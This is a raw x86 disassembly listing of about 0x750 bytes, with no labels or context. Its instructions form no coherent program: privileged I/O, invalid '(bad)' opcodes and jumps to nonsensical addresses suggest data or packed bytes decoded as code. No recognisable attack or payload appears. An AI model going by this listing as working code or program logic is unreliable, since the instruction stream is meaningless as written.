  40e567:	push   ds
  40e568:	pop    ss
  40e569:	xor    ebp,DWORD PTR [esi+0x4b]
  40e56c:	inc    ecx
  40e56d:	xchg   BYTE PTR [esi+esi*4+0x64],al
  40e571:	mov    bh,0x2d
  40e573:	cmc    
  40e574:	enter  0x8c21,0xaa
  40e578:	inc    ebp
  40e579:	xlat   BYTE PTR ds:[ebx]
  40e57a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e57b:	shl    BYTE PTR ds:0x6caa4fd9,1
  40e581:	jbe    0x40e509
  40e583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e584:	or     al,0xc6
  40e586:	sub    ecx,DWORD PTR [ebx-0x34]
  40e589:	ins    DWORD PTR es:[edi],dx
  40e58a:	in     eax,0x1c
  40e58c:	hlt    
  40e58d:	iret   
  40e58e:	nop
  40e58f:	pop    ds
  40e590:	mov    edx,0xe4d38122
  40e595:	push   ebp
  40e596:	in     al,dx
  40e597:	stos   BYTE PTR es:[edi],al
  40e598:	ins    BYTE PTR es:[edi],dx
  40e599:	jmp    0x83158abf
  40e59e:	stos   BYTE PTR es:[edi],al
  40e59f:	mov    ebp,?
  40e5a1:	pop    eax
  40e5a2:	add    BYTE PTR [eax+0x13],dl
  40e5a5:	call   0x61c01e32
  40e5aa:	push   cs
  40e5ab:	in     al,0xf2
  40e5ad:	dec    ecx
  40e5ae:	add    eax,0x9c7574be
  40e5b3:	jb     0x40e5ed
  40e5b5:	inc    ebx
  40e5b6:	int    0x7c
  40e5b8:	mov    al,ds:0xbf825d48
  40e5bd:	mov    ah,0x4
  40e5bf:	pusha  
  40e5c0:	mov    ss,WORD PTR [edx+0x73]
  40e5c3:	das    
  40e5c4:	add    ebx,eax
  40e5c6:	or     dh,BYTE PTR [edi]
  40e5c8:	inc    esp
  40e5c9:	repz ret 
  40e5cb:	mov    dh,al
  40e5cd:	xchg   ebp,eax
  40e5ce:	adc    eax,0xa1c7e841
  40e5d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5d4:	sbb    DWORD PTR [edx-0x772ecd72],ecx
  40e5da:	neg    BYTE PTR [ebx+0x1d]
  40e5dd:	inc    ebx
  40e5de:	lea    ebx,[ebx-0x1f]
  40e5e1:	cs add eax,0x96b5cd3e
  40e5e7:	sbb    ebp,DWORD PTR [eax-0x68]
  40e5ea:	push   cs
  40e5eb:	sbb    edi,DWORD PTR [ecx+0x78eec34]
  40e5f1:	loop   0x40e653
  40e5f3:	int3   
  40e5f4:	xor    eax,0xe2c11e05
  40e5f9:	and    ecx,ecx
  40e5fb:	mov    eax,ds:0xa5e2865c
  40e600:	sub    eax,0x487a0f4f
  40e605:	add    bl,bh
  40e607:	inc    ebx
  40e608:	push   ds
  40e609:	push   eax
  40e60a:	fcomp  DWORD PTR [ecx-0x1903c44e]
  40e610:	push   eax
  40e611:	dec    edx
  40e612:	mov    ecx,0x243aa974
  40e617:	cmp    BYTE PTR ds:0x25f8d4c2,bh
  40e61d:	repnz push 0xfb4b3a33
  40e623:	xchg   ecx,eax
  40e624:	fstp   TBYTE PTR [eax-0x58eeaee4]
  40e62a:	and    DWORD PTR [ecx],0x82a2c0df
  40e630:	aam    0x58
  40e632:	pop    edx
  40e633:	and    dl,BYTE PTR ds:0x6868bd66
  40e639:	std    
  40e63a:	xor    eax,0x60264a15
  40e63f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e640:	mov    dh,0xa4
  40e642:	fcomp  QWORD PTR [eax+esi*2]
  40e645:	add    eax,0xb54a8b70
  40e64a:	cli    
  40e64b:	xchg   ebx,eax
  40e64c:	sbb    DWORD PTR [ebx-0x65b1490a],0x16b3828e
  40e656:	xchg   esp,esi
  40e658:	lahf   
  40e659:	test   al,0x7e
  40e65b:	cdq    
  40e65c:	dec    edi
  40e65d:	push   esp
  40e65e:	rol    BYTE PTR [ebx+eax*2-0x377d79d],cl
  40e665:	retf   0x6125
  40e668:	iret   
  40e669:	xor    al,0x3b
  40e66b:	imul   ebp,DWORD PTR [esi+0x4e],0xc553f748
  40e672:	mov    ebx,0x1cd0c383
  40e677:	sbb    dh,bl
  40e679:	imul   eax,DWORD PTR [ebp+0x3b],0x9ce3d3fa
  40e680:	stos   DWORD PTR es:[edi],eax
  40e681:	sbb    al,bl
  40e683:	test   eax,0x42221eb6
  40e688:	(bad)  
  40e689:	(bad)
  40e68d:	add    edi,DWORD PTR ds:0x66262196
  40e693:	push   ds
  40e694:	stos   DWORD PTR es:[edi],eax
  40e695:	or     DWORD PTR ds:0xe652644d,0x27
  40e69c:	out    0xa7,eax
  40e69e:	xchg   esi,eax
  40e69f:	shl    DWORD PTR [ebx-0x30c5c13a],0xa6
  40e6a6:	into   
  40e6a7:	lods   al,BYTE PTR ds:[esi]
  40e6a8:	adc    al,0xf
  40e6aa:	or     ch,BYTE PTR [ecx]
  40e6ac:	inc    ebx
  40e6ad:	fwait
  40e6ae:	mov    al,0x3a
  40e6b0:	mov    ebx,0xf00a8ba0
  40e6b5:	adc    ebx,0x2fa242f8
  40e6bb:	jbe    0x40e693
  40e6bd:	and    al,0xb8
  40e6bf:	add    BYTE PTR [ebx-0x3678aa38],bh
  40e6c5:	sub    al,0x46
  40e6c7:	arpl   WORD PTR gs:[ecx-0xb7c3121],cx
  40e6ce:	adc    al,0xbe
  40e6d0:	inc    esi
  40e6d1:	xor    ah,BYTE PTR [edi-0x7e781e34]
  40e6d7:	mov    ah,0xda
  40e6d9:	or     DWORD PTR [ecx-0x12286388],0x2d
  40e6e0:	test   al,0x1f
  40e6e2:	repz in al,0xfb
  40e6e5:	xchg   DWORD PTR [eax-0x6c524407],ebx
  40e6eb:	sbb    esi,DWORD PTR [eax]
  40e6ed:	push   edx
  40e6ee:	cs mov esp,0x3cb8e378
  40e6f4:	pop    edi
  40e6f5:	lds    ecx,FWORD PTR [ecx-0x25]
  40e6f8:	test   eax,0xc8aa101e
  40e6fd:	inc    edi
  40e6fe:	inc    esi
  40e6ff:	dec    edx
  40e700:	mov    cl,BYTE PTR [edx+0x3f3f7026]
  40e706:	ds xchg ebp,eax
  40e708:	pop    ebx
  40e709:	sub    al,0x9d
  40e70b:	mov    bh,0xb4
  40e70d:	mov    edx,0x883c5eb0
  40e712:	push   0xffffffa9
  40e714:	xchg   eax,esi
  40e716:	jmp    0x40e6b6
  40e718:	into   
  40e719:	mov    ch,0x62
  40e71b:	pusha  
  40e71c:	ins    BYTE PTR es:[edi],dx
  40e71d:	fist   DWORD PTR [ebp-0x9ecacb8]
  40e723:	fsub   QWORD PTR [ebp-0x74247b21]
  40e729:	scas   al,BYTE PTR es:[edi]
  40e72a:	xor    BYTE PTR [ebp+0x6a],bl
  40e72d:	xchg   DWORD PTR [esi+ebx*1],esp
  40e730:	popa   
  40e731:	arpl   WORD PTR [ecx+0x62],cx
  40e734:	push   edx
  40e735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e736:	push   ss
  40e737:	(bad)  
  40e738:	ds mov esp,0xa637ac64
  40e73e:	adc    BYTE PTR [ebx-0xf],ch
  40e741:	dec    esp
  40e742:	mov    bh,0xc2
  40e744:	push   0x3900d70d
  40e749:	call   0xa2d8cf96
  40e74e:	outs   dx,BYTE PTR ds:[esi]
  40e74f:	(bad)  
  40e750:	lock cdq 
  40e752:	das    
  40e753:	dec    esp
  40e754:	xor    DWORD PTR [ecx+0x6d],0xd84a170c
  40e75b:	push   gs
  40e75d:	aas    
  40e75e:	ins    DWORD PTR es:[edi],dx
  40e75f:	pop    eax
  40e760:	pop    edx
  40e761:	cmp    al,0xc2
  40e763:	outs   dx,DWORD PTR ds:[esi]
  40e764:	mov    ah,0xf3
  40e766:	jo     0x40e74e
  40e768:	test   BYTE PTR [edx],dh
  40e76a:	sbb    si,WORD PTR [edx-0x75a38a11]
  40e771:	jecxz  0x40e711
  40e773:	mov    bh,BYTE PTR [edx-0x200f1dd9]
  40e779:	mov    al,0xd5
  40e77b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e77c:	push   cs
  40e77d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e77e:	push   eax
  40e77f:	mov    edi,0x315beb7
  40e784:	inc    eax
  40e785:	(bad)  
  40e786:	dec    esp
  40e787:	ins    BYTE PTR es:[edi],dx
  40e788:	cmp    eax,0x7a309210
  40e78d:	xor    BYTE PTR [esi+0x17],ch
  40e790:	mov    edi,0x4eb801aa
  40e795:	push   0xee5746cb
  40e79a:	fst    QWORD PTR [edx+0x3254d8fa]
  40e7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7a1:	lods   al,BYTE PTR ds:[esi]
  40e7a2:	adc    BYTE PTR [edi+eiz*1+0x4e],bl
  40e7a6:	push   eax
  40e7a7:	push   ebx
  40e7a8:	fidiv  DWORD PTR [edx+0x31]
  40e7ab:	ds or  bh,dl
  40e7ae:	in     eax,0xfd
  40e7b0:	and    al,0xd5
  40e7b2:	xlat   BYTE PTR ds:[ebx]
  40e7b3:	xchg   edi,eax
  40e7b4:	mov    ah,0xd6
  40e7b6:	mov    dh,0x86
  40e7b8:	lods   eax,DWORD PTR ds:[esi]
  40e7b9:	or     esi,eax
  40e7bb:	addr16 into 
  40e7bd:	mov    esi,DWORD PTR [eax+esi*8-0x76]
  40e7c1:	sti    
  40e7c2:	inc    ebp
  40e7c3:	test   al,0x4a
  40e7c5:	outs   dx,DWORD PTR ds:[esi]
  40e7c6:	pop    ebp
  40e7c7:	mov    cl,0x1f
  40e7c9:	aam    0x4c
  40e7cb:	mov    ds:0x56ef618a,eax
  40e7d0:	and    al,0xf
  40e7d2:	aas    
  40e7d3:	jle    0x40e82a
  40e7d5:	xchg   ebx,eax
  40e7d6:	jge    0x40e7a3
  40e7d8:	in     al,dx
  40e7d9:	mov    ch,0x2a
  40e7db:	xor    DWORD PTR [ebx],eax
  40e7dd:	xchg   esp,eax
  40e7de:	add    eax,0xdedaf739
  40e7e3:	not    BYTE PTR [ebx]
  40e7e5:	jg     0x40e818
  40e7e7:	dec    ebx
  40e7e8:	jnp    0x40e855
  40e7ea:	jg     0x40e845
  40e7ec:	clc    
  40e7ed:	or     eax,0x4bf8ffc8
  40e7f2:	nop
  40e7f3:	in     eax,0xca
  40e7f5:	and    BYTE PTR [ecx-0x586ed676],dl
  40e7fb:	lods   al,BYTE PTR ds:[esi]
  40e7fc:	or     dl,BYTE PTR [edi]
  40e7fe:	dec    ecx
  40e7ff:	jbe    0x40e7cb
  40e801:	jnp    0x40e7af
  40e803:	jae    0x40e884
  40e805:	retf   
  40e806:	sbb    ebp,eax
  40e808:	sub    al,0x53
  40e80a:	fist   DWORD PTR [ebx-0x3b2b1e2a]
  40e810:	push   cs
  40e811:	outs   dx,BYTE PTR ds:[esi]
  40e812:	mov    esp,0x3d6ce61f
  40e817:	nop
  40e818:	jb     0x40e836
  40e81a:	xchg   ecx,eax
  40e81b:	xchg   edi,eax
  40e81c:	dec    ecx
  40e81d:	and    DWORD PTR [ebx],0xd04e5e4b
  40e823:	ins    BYTE PTR es:[edi],dx
  40e824:	call   0x5226ca1f
  40e829:	rcl    BYTE PTR [edi+0x46],0x47
  40e82d:	sub    BYTE PTR [ebp+0x46],dh
  40e830:	cs fs mov cl,0x57
  40e834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e835:	jb     0x40e824
  40e837:	inc    ebx
  40e838:	pop    esp
  40e839:	sub    BYTE PTR [edi+ecx*2-0x32],0x87
  40e83e:	mov    eax,ds:0xae387b77
  40e843:	cdq    
  40e844:	inc    ebx
  40e845:	call   0xe78a1286
  40e84a:	enter  0x58d5,0x78
  40e84e:	dec    eax
  40e84f:	mov    edx,0x82df7a7d
  40e854:	jmp    0x40e8bb
  40e856:	mov    edx,0xa140a259
  40e85b:	clc    
  40e85c:	sahf   
  40e85d:	jbe    0x40e8c1
  40e85f:	(bad)  
  40e860:	jmp    0x3517a5a9
  40e865:	add    eax,0x25de1ea7
  40e86a:	out    dx,al
  40e86b:	or     edi,DWORD PTR [esi]
  40e86d:	call   FWORD PTR [eax+edi*2+0x47]
  40e871:	sub    al,0x41
  40e873:	sbb    DWORD PTR [ecx+edi*2-0x42428331],0x9ba16956
  40e87e:	jmp    0x40e8c4
  40e880:	xor    al,0xaf
  40e882:	(bad)  
  40e883:	in     al,0x16
  40e885:	mov    dh,0xb0
  40e887:	fmul   DWORD PTR [ecx+edi*8+0xab6ac0e]
  40e88e:	push   esp
  40e88f:	inc    edi
  40e890:	dec    ebp
  40e891:	div    ecx
  40e893:	das    
  40e894:	mov    bl,BYTE PTR [ecx-0x42b56b8]
  40e89a:	iret   
  40e89b:	push   esp
  40e89c:	call   0x3f16f0c1
  40e8a1:	xchg   esp,eax
  40e8a2:	jno    0x40e91d
  40e8a4:	popa   
  40e8a5:	mov    ecx,DWORD PTR [ebx-0x1476460f]
  40e8ab:	adc    ecx,eax
  40e8ad:	mov    dl,0xa1
  40e8af:	call   0x9b99ca93
  40e8b4:	ja     0x40e8c5
  40e8b6:	cmp    al,BYTE PTR [edi*1-0x763f0091]
  40e8bd:	cmp    DWORD PTR [edx+edi*4],0xffffffa0
  40e8c1:	mov    ecx,0x348d8f4e
  40e8c6:	scas   al,BYTE PTR es:[edi]
  40e8c7:	jnp    0x40e8c6
  40e8c9:	iret   
  40e8ca:	dec    eax
  40e8cb:	xchg   esp,eax
  40e8cc:	jns    0x40e8fa
  40e8ce:	dec    eax
  40e8cf:	jg     0x40e867
  40e8d1:	jmp    0xf0bed133
  40e8d6:	cwde   
  40e8d7:	push   ecx
  40e8d8:	ret    0x24ce
  40e8db:	mov    al,ds:0xaac51eed
  40e8e0:	retf   
  40e8e1:	imul   ebx,DWORD PTR [ebx+ebp*2],0x36
  40e8e5:	and    BYTE PTR [ecx-0x80],ah
  40e8e8:	xchg   edi,eax
  40e8e9:	ficom  WORD PTR [esi-0x380875ed]
  40e8ef:	jns    0x40e880
  40e8f1:	scas   eax,DWORD PTR es:[edi]
  40e8f2:	xor    dl,0x2d
  40e8f5:	mov    ebx,esp
  40e8f7:	xchg   edx,eax
  40e8f8:	gs int 0x74
  40e8fb:	repnz pop edi
  40e8fd:	adc    eax,0x3bb127d9
  40e902:	mov    ah,0xb0
  40e904:	dec    esi
  40e905:	loope  0x40e973
  40e907:	adc    BYTE PTR [edi],ch
  40e909:	inc    ecx
  40e90a:	std    
  40e90b:	jne    0x40e933
  40e90d:	fld    QWORD PTR [edx+0x68]
  40e910:	dec    esp
  40e911:	and    DWORD PTR [edx],edi
  40e913:	outs   dx,BYTE PTR ds:[esi]
  40e914:	pop    DWORD PTR [ebp-0x893f0f9]
  40e91a:	dec    edx
  40e91b:	loopne 0x40e8fb
  40e91d:	test   DWORD PTR [eax],0xd9a5cba8
  40e923:	hlt    
  40e924:	or     al,0x2e
  40e926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e927:	imul   edi,DWORD PTR [ebx],0x1c252ca
  40e92d:	cmp    DWORD PTR [ebp-0x3c],edi
  40e930:	in     al,dx
  40e931:	sbb    al,0x10
  40e933:	add    eax,0xd5c41a0d
  40e938:	sub    eax,0xbf658f22
  40e93d:	daa    
  40e93e:	int    0xb4
  40e940:	out    0x52,eax
  40e942:	xor    BYTE PTR [ebp-0x47b76c6e],0xa0
  40e949:	push   esp
  40e94a:	les    ecx,FWORD PTR [eax]
  40e94c:	cdq    
  40e94d:	cdq    
  40e94e:	mov    bh,0xaa
  40e950:	adc    DWORD PTR [edx-0x6ae5e9ba],eax
  40e956:	add    esi,DWORD PTR [ebp+0x17]
  40e959:	std    
  40e95a:	pop    ecx
  40e95b:	mov    esi,0x6d56a3ee
  40e960:	or     al,0x55
  40e962:	div    BYTE PTR [edi+0x114af85d]
  40e968:	dec    DWORD PTR [esi+ebp*8]
  40e96b:	imul   ebx,DWORD PTR [edi+0xd],0xe910fc4e
  40e972:	adc    BYTE PTR [esi],cl
  40e974:	neg    BYTE PTR [eax]
  40e976:	rol    eax,1
  40e978:	cmp    al,BYTE PTR [ecx-0x22]
  40e97b:	jmp    FWORD PTR [ebx+0xf6955b4]
  40e981:	pop    esp
  40e982:	fisub  DWORD PTR [edi-0x4c]
  40e985:	add    ah,BYTE PTR [ebx]
  40e987:	push   edi
  40e988:	jnp    0x40e916
  40e98a:	in     eax,dx
  40e98b:	stos   BYTE PTR es:[edi],al
  40e98c:	or     ah,BYTE PTR [edi+0x14cd70e9]
  40e992:	adc    DWORD PTR [eax+0x27],ecx
  40e995:	xchg   edi,eax
  40e996:	sbb    eax,0xe9eb3fbd
  40e99b:	nop
  40e99c:	mov    esi,0x61291eab
  40e9a1:	sub    BYTE PTR [esi+0x7c548a73],al
  40e9a7:	push   ebx
  40e9a8:	sbb    BYTE PTR [esp+ecx*1+0x672f8b58],cl
  40e9af:	cwde   
  40e9b0:	add    al,0xc0
  40e9b2:	cli    
  40e9b3:	mov    DWORD PTR [eax],ecx
  40e9b5:	data16 arpl WORD PTR [bx+si+0x1eb5],dx
  40e9bb:	cwde   
  40e9bc:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40e9be:	outs   dx,DWORD PTR ss:[esi]
  40e9c0:	xor    eax,0x7f264a0f
  40e9c5:	mov    ds:0x49da40e5,al
  40e9ca:	lods   eax,DWORD PTR ds:[esi]
  40e9cb:	push   edx
  40e9cc:	test   eax,0xd5ffaf35
  40e9d1:	pop    ss
  40e9d2:	call   0x4797e2ed
  40e9d7:	inc    ebx
  40e9d8:	dec    ebp
  40e9d9:	mov    bh,0x5a
  40e9db:	xchg   esi,eax
  40e9dd:	sub    DWORD PTR [edx],ebp
  40e9df:	test   al,0x98
  40e9e1:	sub    dl,bh
  40e9e3:	cmp    DWORD PTR [eax+0x366287fa],edx
  40e9e9:	sub    eax,0x5a524196
  40e9ee:	loop   0x40ea51
  40e9f0:	rcl    BYTE PTR [eax+0x319707a5],cl
  40e9f6:	fadd   DWORD PTR [esi-0x4a]
  40e9f9:	pop    esi
  40e9fa:	jae    0x40ea1f
  40e9fc:	jmp    0x40ea76
  40e9fe:	outs   dx,BYTE PTR ds:[esi]
  40e9ff:	retf   
  40ea00:	push   ecx
  40ea01:	mov    edx,0x71006c18
  40ea06:	adc    eax,DWORD PTR [edx-0xc681eb7]
  40ea0c:	or     BYTE PTR [edi+0x58],0x38
  40ea10:	test   eax,0x1da448cf
  40ea15:	in     eax,0xfd
  40ea17:	mov    ecx,fs
  40ea19:	mov    ebp,0x1d10e5cf
  40ea1e:	pop    ss
  40ea1f:	mov    ch,0x37
  40ea21:	adc    ch,BYTE PTR ds:[ecx+0x6268c90a]
  40ea28:	out    0x49,eax
  40ea2a:	pop    esp
  40ea2b:	jnp    0x40ea7c
  40ea2d:	aad    0x0
  40ea2f:	xchg   esp,eax
  40ea30:	mov    cl,0x6
  40ea32:	dec    ebp
  40ea33:	xchg   edx,eax
  40ea34:	xor    DWORD PTR [esi+0x41],eax
  40ea37:	or     al,0xf7
  40ea39:	jl     0x40ea14
  40ea3b:	mov    dh,0x42
  40ea3d:	adc    ecx,esi
  40ea3f:	out    dx,eax
  40ea40:	xchg   ecx,eax
  40ea41:	and    al,0xac
  40ea43:	and    ah,al
  40ea45:	dec    esp
  40ea46:	es imul edi,eax,0x47
  40ea4a:	push   ecx
  40ea4c:	dec    esi
  40ea4d:	repz adc eax,0x27cda2e6
  40ea53:	sub    DWORD PTR [ecx+0x10b24bfb],edx
  40ea59:	sbb    ecx,edx
  40ea5b:	aad    0x87
  40ea5d:	push   ds
  40ea5e:	ret    
  40ea5f:	sahf   
  40ea60:	inc    eax
  40ea61:	call   0x90d74d0e
  40ea66:	jle    0x40eabf
  40ea68:	scas   eax,DWORD PTR es:[edi]
  40ea69:	dec    esp
  40ea6a:	das    
  40ea6b:	js     0x40ead1
  40ea6d:	test   BYTE PTR [ecx],bh
  40ea6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea70:	pop    es
  40ea71:	sub    bh,BYTE PTR [ebp-0x585edcc5]
  40ea77:	stos   DWORD PTR es:[edi],eax
  40ea78:	in     eax,dx
  40ea79:	mov    edx,0xb0ba182e
  40ea7e:	and    edi,DWORD PTR [ebp-0x4ae1467b]
  40ea84:	pop    edi
  40ea85:	add    DWORD PTR ds:0xa16fbe07,edx
  40ea8b:	in     eax,dx
  40ea8c:	cmp    eax,0x9bc69e44
  40ea91:	fistp  WORD PTR [edx-0x32]
  40ea94:	das    
  40ea95:	sbb    al,0x12
  40ea97:	push   ecx
  40ea98:	mov    ecx,0x478f6a0d
  40ea9d:	add    BYTE PTR [ebp+0x7fc79347],ch
  40eaa3:	pop    ecx
  40eaa4:	cmp    BYTE PTR [edi+0x1a],bh
  40eaa7:	(bad)  
  40eaa8:	pop    esi
  40eaa9:	js     0x40ea2b
  40eaab:	dec    edx
  40eaac:	jae    0x40ea40
  40eaae:	and    al,0xfd
  40eab0:	fucomi st,st(0)
  40eab2:	test   al,0x15
  40eab4:	or     dl,BYTE PTR [edx-0x11]
  40eab7:	and    BYTE PTR [ebp-0x7b],0x4
  40eabb:	cmc    
  40eabc:	mov    dh,0x93
  40eabe:	push   ss
  40eabf:	xor    BYTE PTR [edi],ch
  40eac1:	in     eax,dx
  40eac2:	jnp    0x40eb15
  40eac4:	sbb    al,0x2
  40eac6:	daa    
  40eac7:	cmp    edx,esp
  40eac9:	mov    ecx,0x22a8686c
  40eace:	mov    dl,dh
  40ead0:	call   0x2dd:0x36fceb19
  40ead7:	aam    0xd1
  40ead9:	inc    esi
  40eada:	xor    eax,0xdf10ed7c
  40eadf:	and    ah,BYTE PTR [esi-0x5e2fff4d]
  40eae5:	inc    ebp
  40eae6:	pop    edi
  40eae7:	retf   0x3f38
  40eaea:	inc    ebx
  40eaeb:	xchg   edx,eax
  40eaec:	sub    al,cl
  40eaee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaef:	pushf  
  40eaf0:	fwait
  40eaf1:	mov    bl,0x93
  40eaf3:	or     BYTE PTR [esi+0x3257c7e6],ah
  40eaf9:	lods   eax,DWORD PTR ds:[esi]
  40eafb:	jnp    0x40ea9c
  40eafd:	int    0x18
  40eaff:	jge    0x40eaa0
  40eb01:	push   ebp
  40eb02:	mov    bh,0xdf
  40eb04:	call   0xee7d6dff
  40eb09:	add    DWORD PTR [ecx],eax
  40eb0b:	out    0x0,eax
  40eb0d:	mov    bl,0xc
  40eb0f:	mov    eax,ds:0xa3141e1d
  40eb14:	jbe    0x40eb6c
  40eb16:	cmp    BYTE PTR [edx-0x5f5ac8cd],ah
  40eb1c:	mov    cl,0xd9
  40eb1e:	rcr    DWORD PTR [esi+ebx*2+0x748fc41b],cl
  40eb25:	ret    0x27a1
  40eb28:	cmc    
  40eb29:	sub    esi,DWORD PTR [edi]
  40eb2b:	xor    ebp,DWORD PTR [esp+eax*2+0x5e]
  40eb2f:	iret   
  40eb30:	in     al,0xce
  40eb32:	scas   al,BYTE PTR es:[edi]
  40eb33:	call   0x7371:0xa5a125a6
  40eb3a:	mov    ebx,0x94f5d925
  40eb3f:	mov    ?,WORD PTR [esi]
  40eb41:	scas   al,BYTE PTR es:[edi]
  40eb42:	add    eax,0x3f43d093
  40eb47:	enter  0x128e,0x89
  40eb4b:	loopne 0x40eb6a
  40eb4d:	fadd   DWORD PTR [ebp-0x20be6d8]
  40eb53:	addr16 test al,0xc1
  40eb56:	pop    esp
  40eb57:	nop
  40eb58:	pop    eax
  40eb59:	jmp    0xc56fa3ec
  40eb5e:	xor    ch,BYTE PTR [edx+ecx*4-0x4b297ec1]
  40eb65:	mov    esi,0x3a42b5bd
  40eb6a:	jo     0x40eb33
  40eb6c:	rol    BYTE PTR ds:0x934baa2a,0x1e
  40eb73:	scas   al,BYTE PTR es:[edi]
  40eb74:	bound  ecx,QWORD PTR [ebp+0x0]
  40eb77:	add    DWORD PTR [ebx+0x34],esi
  40eb7a:	test   al,0x7b
  40eb7c:	in     eax,0x44
  40eb7e:	jbe    0x40ebdd
  40eb80:	xor    BYTE PTR [esi+0x5],0x55
  40eb84:	push   edx
  40eb85:	mov    bl,0x9b
  40eb87:	mov    ah,0x54
  40eb89:	loopne 0x40eb66
  40eb8b:	popa   
  40eb8c:	das    
  40eb8d:	or     al,0xd6
  40eb8f:	in     eax,0x1
  40eb91:	pop    edi
  40eb92:	(bad)  
  40eb93:	mov    ebp,0xa4c3ef5e
  40eb98:	xor    BYTE PTR ds:0x480e93da,al
  40eb9e:	sbb    al,0x56
  40eba0:	lods   eax,DWORD PTR ds:[esi]
  40eba1:	int    0xdc
  40eba3:	xchg   edx,eax
  40eba4:	and    edx,DWORD PTR [edi+ecx*1+0x3e33968d]
  40ebab:	ins    BYTE PTR es:[edi],dx
  40ebac:	pop    es
  40ebad:	daa    
  40ebae:	fimul  DWORD PTR [ebp-0x3a]
  40ebb1:	stc    
  40ebb2:	push   ds
  40ebb3:	(bad)  
  40ebb4:	fwait
  40ebb5:	push   edi
  40ebb6:	aaa    
  40ebb7:	sbb    BYTE PTR [esi-0x6e],bh
  40ebba:	sbb    eax,esp
  40ebbc:	sahf   
  40ebbd:	cmp    cl,BYTE PTR [eax]
  40ebbf:	adc    DWORD PTR [eax*4-0x40b4830b],0xc5dfafea
  40ebca:	sub    BYTE PTR [esi],ch
  40ebcc:	pop    es
  40ebcd:	fwait
  40ebce:	xchg   edi,eax
  40ebcf:	jns    0x40ebb6
  40ebd1:	add    DWORD PTR [ebx],0x17763777
  40ebd7:	pop    ds
  40ebd8:	test   BYTE PTR [edi],ch
  40ebda:	aas    
  40ebdb:	dec    eax
  40ebdc:	mov    cl,0x31
  40ebde:	push   esi
  40ebdf:	sbb    al,BYTE PTR [ecx+0x72]
  40ebe2:	push   edi
  40ebe3:	mov    dh,0x15
  40ebe5:	push   0xe9506ce2
  40ebea:	and    ebp,0x59
  40ebed:	dec    ebx
  40ebee:	inc    esi
  40ebef:	(bad)  
  40ebf0:	aaa    
  40ebf1:	dec    eax
  40ebf2:	popf   
  40ebf3:	push   esp
  40ebf4:	scas   eax,DWORD PTR es:[edi]
  40ebf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebf6:	ins    DWORD PTR es:[edi],dx
  40ebf7:	ins    DWORD PTR es:[edi],dx
  40ebf8:	jg     0x40ec46
  40ebfa:	cli    
  40ebfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebfc:	xchg   ebx,eax
  40ebfd:	inc    ebp
  40ebfe:	mov    al,ds:0x233ec007
  40ec03:	stos   DWORD PTR es:[edi],eax
  40ec04:	inc    ecx
  40ec05:	or     eax,0x27e6c83c
  40ec0a:	push   cs
  40ec0b:	ja     0x40ec06
  40ec0d:	and    BYTE PTR [esi+edi*2+0x7cb345b8],ch
  40ec14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec15:	jmp    0x40eba3
  40ec17:	rcr    eax,0x2a
  40ec1a:	jle    0x40ec97
  40ec1c:	pop    ebx
  40ec1d:	inc    ebp
  40ec1e:	fwait
  40ec1f:	cmp    al,0x7a
  40ec21:	and    ah,ah
  40ec23:	leave  
  40ec24:	inc    eax
  40ec25:	pop    esp
  40ec26:	bswap  edi
  40ec28:	xor    DWORD PTR [esi-0xaa67cc3],ebp
  40ec2e:	cmp    eax,0x7af0ac75
  40ec33:	rcr    BYTE PTR [eax],1
  40ec35:	inc    esp
  40ec36:	or     ecx,esp
  40ec38:	arpl   WORD PTR [eax],bp
  40ec3a:	lods   al,BYTE PTR ds:[esi]
  40ec3b:	and    al,0xac
  40ec3d:	icebp  
  40ec3e:	push   0x318df18e
  40ec43:	pop    ecx
  40ec44:	popf   
  40ec45:	mov    esi,0xf7bc85e8
  40ec4a:	xchg   ecx,eax
  40ec4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec4c:	pop    es
  40ec4d:	sbb    ebp,DWORD PTR [esi+0x77]
  40ec50:	ds fs ins BYTE PTR es:[edi],dx
  40ec53:	scas   eax,DWORD PTR es:[edi]
  40ec54:	jle    0xba76c99b
  40ec5a:	lods   eax,DWORD PTR ds:[esi]
  40ec5b:	cli    
  40ec5c:	xor    cl,dh
  40ec5e:	cld    
  40ec5f:	inc    esp
  40ec60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec61:	bound  edx,QWORD PTR [eax]
  40ec63:	cdq    
  40ec64:	sub    BYTE PTR ds:0x876468b1,bh
  40ec6a:	mov    cl,dl
  40ec6c:	push   es
  40ec6d:	inc    ecx
  40ec6e:	jg     0x40ecdc
  40ec70:	out    dx,al
  40ec71:	mov    eax,ds:0xb377fbfb
  40ec76:	(bad)  
  40ec77:	in     al,dx
  40ec78:	rcl    BYTE PTR [eax],cl
  40ec7a:	mov    ecx,0x767c32db
  40ec7f:	and    DWORD PTR [ecx-0x5ad4d28f],eax
  40ec85:	adc    DWORD PTR [edi+0x7349d229],eax
  40ec8b:	aas    
  40ec8c:	jno    0x40ecac
  40ec8e:	or     cl,BYTE PTR [ebx-0x7463b70]
  40ec94:	leave  
  40ec95:	xor    BYTE PTR [eax-0x29],dl
  40ec98:	pop    esi
  40ec99:	shl    dl,1
  40ec9b:	xchg   BYTE PTR [ebp-0x30],dl
  40ec9e:	jae    0x40ec35
  40eca0:	dec    esp
  40eca1:	mov    bh,0x60
  40eca3:	inc    ebp
  40eca4:	pop    edx
  40eca5:	adc    DWORD PTR [ecx],eax
  40eca7:	mov    cl,0xfd
  40eca9:	in     eax,0x8e
  40ecab:	rcr    BYTE PTR [ecx-0x52],0x49
  40ecaf:	js     0x40ec6e
